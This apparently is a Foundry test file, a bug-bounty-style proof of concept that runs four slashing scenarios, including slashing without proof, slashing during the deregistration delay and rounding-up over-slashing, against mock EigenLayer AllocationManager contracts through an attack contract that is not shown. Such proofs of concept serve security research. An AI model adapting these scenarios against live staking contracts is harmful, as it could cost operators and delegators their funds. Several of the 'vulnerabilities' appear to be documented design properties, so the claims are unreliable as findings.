// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../pocs/EigenLayerSlashingAttack.sol";
import "../../src/PoC.sol";
import "../../src/mocks/eigenlayer/EigenLayerMocks.sol";
import "../../src/mocks/tokens/ERC20Mock.sol";

/// @title EigenLayer AllocationManager Vulnerability PoC
/// @notice Proof of Concept demonstrating 4 critical vulnerabilities in EigenLayer AllocationManager
/// @dev Based on Immunefi forge-poc-templates structure
/// @dev Uses MOCK contracts - DO NOT use against production contracts
/// 
/// VULNERABILITIES DEMONSTRATED:
/// 1. No On-Chain Validation of Misbehavior - Slashers can slash without proof
/// 2. Deregistration Delay Window - Operators remain slashable after deregistration
/// 3. No Appeal Mechanism - Slashing is irreversible
/// 4. Rounding Up Can Cause Over-Slashing - Mathematical precision issues
contract EigenLayerSlashingPoCTest is PoC {
    EigenLayerSlashingAttack attackContract;
    IERC20[] tokens;

    // Mock contracts (NOT production contracts)
    MockAllocationManager allocationManager;
    MockDelegationManager delegationManager;
    MockStrategyManager strategyManager;
    MockStrategy mockStrategy;
    IERC20 mockToken;
    
    // Test actors
    address constant OPERATOR = address(0x11111);
    address constant AVS_ADMIN = address(0x22222);
    address constant SLASHER = address(0x33333);
    address constant DELEGATOR = address(0x44444);
    
    OperatorSet operatorSet;
    IStrategy[] strategies;

    uint256 constant INITIAL_MAGNITUDE = 1e18;
    uint256 constant INITIAL_SHARES = 1000 ether;

    function setUp() public {
        // Deploy mock contracts (NOT production)
        mockToken = new ERC20Mock("Mock Token", "MOCK", 18);
        mockStrategy = new MockStrategy(mockToken);
        delegationManager = new MockDelegationManager();
        strategyManager = new MockStrategyManager();
        allocationManager = new MockAllocationManager();
        
        // Initialize operator set
        operatorSet = OperatorSet({
            avs: AVS_ADMIN,
            id: 1
        });
        
        // Initialize strategies array
        strategies = new IStrategy[](1);
        strategies[0] = IStrategy(address(mockStrategy));
        
        // Setup operator set
        CreateSetParamsV2[] memory createParams = new CreateSetParamsV2[](1);
        createParams[0] = CreateSetParamsV2({
            operatorSetId: operatorSet.id,
            strategies: strategies,
            slasher: SLASHER
        });
        
        allocationManager.createOperatorSets(AVS_ADMIN, createParams);
        allocationManager.updateAVSMetadataURI(AVS_ADMIN, "https://mock-avs.com");
        
        // Setup operator
        allocationManager.setOperatorRegistered(OPERATOR, operatorSet, true);
        allocationManager.setMaxMagnitude(OPERATOR, strategies[0], uint64(INITIAL_MAGNITUDE));
        allocationManager.setAllocation(OPERATOR, operatorSet, strategies[0], uint64(INITIAL_MAGNITUDE));
        
        // Setup delegator
        delegationManager.setOperatorShares(OPERATOR, strategies[0], INITIAL_SHARES);
        strategyManager.setStakerDepositShares(DELEGATOR, strategies[0], INITIAL_SHARES);
        delegationManager.delegateTo(OPERATOR, "", "");
        
        // Deploy attack contract
        attackContract = new EigenLayerSlashingAttack(
            address(allocationManager),
            OPERATOR,
            AVS_ADMIN,
            SLASHER,
            operatorSet,
            strategies
        );

        // Authorize attack contract to slash on behalf of slasher
        allocationManager.setAuthorizedSlasher(address(attackContract), true);

        // Set aliases for better logging
        setAlias(address(allocationManager), "MockAllocationManager");
        setAlias(OPERATOR, "Operator");
        setAlias(DELEGATOR, "Delegator");
        setAlias(SLASHER, "Slasher");
        setAlias(AVS_ADMIN, "AVSAdmin");
        setAlias(address(attackContract), "AttackContract");

        // Set log level for detailed output
        setLogLevel(1);

        console.log("\n>>> Initial conditions (MOCK ENVIRONMENT)");
        console.log("AllocationManager:", address(allocationManager));
        console.log("Operator:", OPERATOR);
        console.log("Slasher:", SLASHER);
        console.log("Initial Magnitude:", INITIAL_MAGNITUDE);
        console.log("Initial Shares:", INITIAL_SHARES);
    }

    /// @notice VULNERABILITY #1: No On-Chain Validation of Misbehavior
    function testAttack_VULN1_NoOnChainValidation() public snapshot(DELEGATOR, tokens) {
        console.log("\n=== VULNERABILITY #1: No On-Chain Validation of Misbehavior ===");
        
        // Get initial state
        Allocation memory allocationBefore = allocationManager.getAllocation(
            OPERATOR,
            operatorSet,
            strategies[0]
        );
        uint256[] memory maxMagnitudesBefore = allocationManager.getMaxMagnitudes(OPERATOR, strategies);
        
        console.log("\nInitial State:");
        console.log("  Operator Magnitude:", allocationBefore.currentMagnitude);
        console.log("  Operator Max Magnitude:", maxMagnitudesBefore[0]);

        // VULNERABILITY: Slasher can slash with ANY percentage without providing proof
        console.log("\n[ATTACK] Legitimate slasher slashes operator with 50% WITHOUT providing on-chain proof");
        vm.prank(SLASHER);
        attackContract.slashWithoutProof(1e18 / 2); // 50% slash

        // Get state after slash
        Allocation memory allocationAfter = allocationManager.getAllocation(
            OPERATOR,
            operatorSet,
            strategies[0]
        );
        uint256[] memory maxMagnitudesAfter = allocationManager.getMaxMagnitudes(OPERATOR, strategies);

        console.log("\nAfter Slash:");
        console.log("  Operator Magnitude:", allocationAfter.currentMagnitude);
        console.log("  Operator Max Magnitude:", maxMagnitudesAfter[0]);

        // Verify vulnerability
        assertLt(allocationAfter.currentMagnitude, allocationBefore.currentMagnitude, "Magnitude should be reduced");
        assertLt(maxMagnitudesAfter[0], maxMagnitudesBefore[0], "Max magnitude should be permanently reduced");

        console.log("\n[VULNERABILITY CONFIRMED] Slasher can slash without on-chain proof");
        console.log("  Operator maxMagnitude permanently reduced by:", maxMagnitudesBefore[0] - maxMagnitudesAfter[0]);
    }

    /// @notice VULNERABILITY #2: Deregistration Delay Window
    function testAttack_VULN2_DeregistrationDelayWindow() public snapshot(DELEGATOR, tokens) {
        console.log("\n=== VULNERABILITY #2: Deregistration Delay Window ===");
        
        // Get initial state
        Allocation memory allocationBefore = allocationManager.getAllocation(
            OPERATOR,
            operatorSet,
            strategies[0]
        );
        
        console.log("\nInitial State:");
        console.log("  Operator Magnitude:", allocationBefore.currentMagnitude);

        // Step 1: Operator deregisters
        console.log("\n[STEP 1] Operator deregisters from operator set");
        uint32 deregisterBlock = uint32(block.number);
        
        uint32[] memory operatorSetIds = new uint32[](1);
        operatorSetIds[0] = operatorSet.id;
        
        DeregisterParams memory deregisterParams = DeregisterParams({
            operator: OPERATOR,
            avs: AVS_ADMIN,
            operatorSetIds: operatorSetIds
        });

        vm.prank(OPERATOR);
        allocationManager.deregisterFromOperatorSets(deregisterParams);

        bool isRegistered = allocationManager.isMemberOfOperatorSet(OPERATOR, operatorSet);
        bool isSlashable = allocationManager.isOperatorSlashable(OPERATOR, operatorSet);
        
        console.log("  Operator Registered:", isRegistered);
        console.log("  Operator Slashable:", isSlashable);
        assertFalse(isRegistered, "Operator should not be registered");
        assertTrue(isSlashable, "VULNERABILITY: Operator still slashable after deregistration!");

        // Step 2: Move forward to just before delay expires
        console.log("\n[STEP 2] Moving forward to just before delay expires");
        uint32 deallocationDelay = allocationManager.DEALLOCATION_DELAY();
        vm.roll(deregisterBlock + deallocationDelay);
        isSlashable = allocationManager.isOperatorSlashable(OPERATOR, operatorSet);
        assertTrue(isSlashable, "Operator should still be slashable");

        // Step 3: Slasher slashes operator AFTER deregistration
        console.log("\n[ATTACK] Slasher slashes operator AFTER deregistration (during delay window)");
        vm.prank(SLASHER);
        attackContract.slashAfterDeregistration();

        Allocation memory allocationAfter = allocationManager.getAllocation(
            OPERATOR,
            operatorSet,
            strategies[0]
        );

        console.log("\nAfter Slash:");
        console.log("  Operator Magnitude:", allocationAfter.currentMagnitude);

        // Verify vulnerability
        assertLt(allocationAfter.currentMagnitude, allocationBefore.currentMagnitude, "VULNERABILITY: Operator was slashed after deregistration!");

        console.log("\n[VULNERABILITY CONFIRMED] Operator can be slashed after deregistration");
        console.log("  This creates a", deallocationDelay, "block window of vulnerability after deregistration");
    }

    /// @notice VULNERABILITY #3: No Appeal Mechanism
    function testAttack_VULN3_NoAppealMechanism() public snapshot(DELEGATOR, tokens) {
        console.log("\n=== VULNERABILITY #3: No Appeal Mechanism ===");
        
        // Get initial state
        Allocation memory allocationBefore = allocationManager.getAllocation(
            OPERATOR,
            operatorSet,
            strategies[0]
        );
        uint256[] memory maxMagnitudesBefore = allocationManager.getMaxMagnitudes(OPERATOR, strategies);

        console.log("\nInitial State:");
        console.log("  Operator Magnitude:", allocationBefore.currentMagnitude);
        console.log("  Operator Max Magnitude:", maxMagnitudesBefore[0]);

        // Step 1: Operator is incorrectly slashed
        console.log("\n[ATTACK] Operator is incorrectly slashed (e.g., due to slasher error)");
        vm.prank(SLASHER);
        attackContract.slashAndTryRecover();

        Allocation memory allocationAfter = allocationManager.getAllocation(
            OPERATOR,
            operatorSet,
            strategies[0]
        );
        uint256[] memory maxMagnitudesAfter = allocationManager.getMaxMagnitudes(OPERATOR, strategies);

        console.log("\nAfter Slash:");
        console.log("  Operator Magnitude:", allocationAfter.currentMagnitude);
        console.log("  Operator Max Magnitude:", maxMagnitudesAfter[0]);

        // Step 2: Wait for deallocation delay
        console.log("\n[STEP 2] Waiting for deallocation delay...");
        uint32 deallocationDelay = allocationManager.DEALLOCATION_DELAY();
        vm.roll(block.number + deallocationDelay + 1);

        // Step 3: Operator tries to allocate back to original amount (should fail)
        console.log("\n[STEP 3] Operator tries to allocate back to original amount...");
        uint256[] memory maxMagnitudesAfterDeallocate = allocationManager.getMaxMagnitudes(OPERATOR, strategies);
        console.log("  Max Magnitude After Deallocation:", maxMagnitudesAfterDeallocate[0]);
        console.log("  Attempting to allocate:", maxMagnitudesBefore[0]);

        // This should fail because maxMagnitude is permanently reduced
        uint64[] memory newMagnitudes = new uint64[](strategies.length);
        newMagnitudes[0] = uint64(maxMagnitudesBefore[0]);
        
        AllocateParams[] memory allocateParams = new AllocateParams[](1);
        allocateParams[0] = AllocateParams({
            operatorSet: operatorSet,
            strategies: strategies,
            newMagnitudes: newMagnitudes
        });

        vm.expectRevert();
        vm.prank(OPERATOR);
        allocationManager.modifyAllocations(OPERATOR, allocateParams);

        console.log("\n[VULNERABILITY CONFIRMED] Slashing is irreversible - no appeal mechanism exists");
        console.log("  Max Magnitude permanently reduced from", maxMagnitudesBefore[0], "to", maxMagnitudesAfter[0]);
        console.log("  Even if slasher realizes mistake, there's NO WAY to reverse it");
    }

    /// @notice VULNERABILITY #4: Rounding Up Can Cause Over-Slashing
    function testAttack_VULN4_RoundingUpOverSlashing() public snapshot(DELEGATOR, tokens) {
        console.log("\n=== VULNERABILITY #4: Rounding Up Can Cause Over-Slashing ===");
        
        // Get initial magnitude
        Allocation memory allocationBefore = allocationManager.getAllocation(
            OPERATOR,
            operatorSet,
            strategies[0]
        );
        
        uint64 initialMag = allocationBefore.currentMagnitude;
        console.log("\nInitial State:");
        console.log("  Current Magnitude:", initialMag);

        // Use a small slash percentage that might cause rounding issues
        uint256 wadToSlash = 1e18 / 100; // 1%

        // Calculate expected slash using exact math (no rounding)
        uint256 expectedSlashedExact = (uint256(initialMag) * wadToSlash) / 1e18;

        console.log("\n[ATTACK] Slashing with 1% (small percentage to test rounding)");
        console.log("  Expected slashed (exact math):", expectedSlashedExact);

        vm.prank(SLASHER);
        attackContract.slashWithRounding(wadToSlash);

        Allocation memory allocationAfter = allocationManager.getAllocation(
            OPERATOR,
            operatorSet,
            strategies[0]
        );

        uint64 actualSlashed = initialMag - allocationAfter.currentMagnitude;

        console.log("  Actual slashed (with rounding):", actualSlashed);
        console.log("  Magnitude After:", allocationAfter.currentMagnitude);

        // Verify rounding causes over-slashing
        assertGe(actualSlashed, expectedSlashedExact, "Rounding should cause >= expected slash");
        
        if (actualSlashed > expectedSlashedExact) {
            console.log("\n[VULNERABILITY CONFIRMED] Over-slashing detected due to rounding up!");
            console.log("  Over-slashing amount:", actualSlashed - expectedSlashedExact);
            console.log("  This affects all slashing operations, not just malicious ones");
        } else {
            console.log("\n[NOTE] No over-slashing detected in this case, but rounding up can cause it");
        }
    }
}
